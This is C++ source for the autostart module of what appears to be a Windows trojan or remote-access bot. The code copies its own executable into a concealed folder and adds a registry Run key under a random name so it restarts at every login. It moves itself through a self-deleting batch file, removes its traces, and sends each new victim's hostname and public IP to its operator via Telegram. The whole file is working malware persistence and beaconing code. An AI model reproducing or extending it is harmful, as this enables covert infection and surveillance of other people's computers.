#include <iostream>
#include <Windows.h>
#include <fstream>
#include "autostart.h"
#include "globals.h"
#include "telegram.h"
#include "tools.h"

//need to delete o.bat
void autostart() {
    std::string path = PATH;
    int find = path.find("$sysdisk$");
    if (find != std::string::npos) {
        std::string npath;
        npath = tools::GetSysDiskLetter();
        npath += ":" + path.substr(find + std::string("$sysdisk$").size(), path.size());
        path = npath;
    }

    find = path.find("$username$");
    if (find != std::string::npos) {
        path.erase(find, std::string("$username$").size());
        path.insert(find, tools::get_username());
    }

    if (!tools::filexists(path + "\\" + tools::get_exe())) {
        telegram::Send("New user\nUsername: " + tools::hostname() + "\nip: " + tools::public_ip());

        std::fstream file;
        file.open("o.bat", std::ios::out);
        file << "TASKKILL /F /IM " << tools::get_exe() << std::endl
            << "move " << tools::get_exe() << +" " + path << std::endl
            << "move " << DATA_FILENAME << +" " + path << std::endl
            << "move " << "shitoo " << path << std::endl
            << "start " + path + "/" + tools::get_exe() << std::endl
            << "exit";
        file.close();

        //if there's already no key for autosrat then it adds one
        std::string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f " + tools::get_exe();
        if (tools::cmd_output(s.c_str()).find("End of search: 0 match(es) found.") != std::string::npos) {
            std::cout << "Adding new key for autostart\n";
            std::string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + tools::random_string(16) + " /t REG_SZ /d " + path + "\\" + tools::get_exe();
            system(cmd.c_str());
        }
        file.open("shitoo", std::ios::out);
        file << tools::get_path() + "o.bat";
        file.close();
        system("start /min o.bat");
    }
    if (tools::filexists(path + "\\shitoo")) {
        std::fstream file;
        std::string path2;
        file.open(path + "\\shitoo", std::ios::in);
        std::getline(file, path2);
        file.close();

        system(std::string("del \"" + path + "\\" + "shitoo\"").c_str());
        system(std::string("del \"" + path2 + "\"").c_str());
    }
}